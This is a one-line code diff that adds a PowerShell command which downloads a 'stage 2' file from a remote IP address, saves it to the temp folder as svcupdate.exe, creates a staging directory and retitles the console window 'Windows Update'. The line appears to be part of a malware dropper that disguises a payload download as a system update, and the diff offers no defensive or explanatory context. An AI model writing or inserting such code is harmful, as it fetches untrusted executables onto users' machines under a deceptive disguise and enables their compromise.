@@ -1,0 +1,1 @@
+$Stage2Url = "http://192.0.2.83/assets/update.dat"; $OutputPath = "$env:TEMP\svcupdate.exe"; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $OutputPath); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
